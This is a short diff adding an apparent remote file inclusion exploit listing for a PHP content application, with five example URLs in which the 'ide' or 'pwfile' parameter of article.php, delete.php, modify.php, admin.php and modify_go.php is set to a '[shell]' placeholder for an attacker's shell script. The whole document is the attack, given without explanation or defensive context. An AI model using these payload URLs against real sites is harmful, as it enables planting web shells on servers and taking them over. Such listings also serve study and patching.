@@ -1,0 +1,10 @@
+http://www.example.com/[path]/content/article.php?ide=[shell]
+
+http://www.example.com/[path]/content/delete.php?pwfile=[shell]
+
+http://www.example.com/[path]/content/modify.php?pwfile=[shell]
+
+http://www.example.com/[path]/content/admin.php?pwfile=[shell]
+
+http://www.example.com/[path]/content/modify_go.php?pwfile=[shell]
+
